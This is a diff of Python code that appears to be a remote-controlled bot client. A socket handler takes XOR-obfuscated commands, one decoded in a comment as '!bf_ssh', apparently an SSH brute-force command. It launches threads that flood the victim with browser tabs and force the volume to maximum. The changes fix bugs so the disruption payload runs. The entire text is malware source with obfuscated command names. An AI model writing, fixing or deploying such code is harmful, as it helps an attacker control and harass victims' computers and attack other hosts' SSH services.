@@ -44,7 +44,7 @@ def doom(url):
 				break
 			else:  
 				webbrowser.open_new_tab(url)
-				call(["amixer", "-D", "pulse", "sset", "Master", "100%"])
+				subprocess.call(["amixer", "-D", "pulse", "sset", "Master", "100%"])
 		except:
 			pass
 
@@ -173,7 +173,7 @@ def handle(sock):
 						attack =0
 					stop= False
 					for _ in range(int(command[2])):
-						p= threading.Thread(target=doom, args = (command[1]))
+						p= threading.Thread(target=doom, args = (command[1],))
 						p.start()
 					attack+=1
 				elif command[0] == xor_dec('QBECORQbAg==',key):#encoded keyword: !bf_ssh
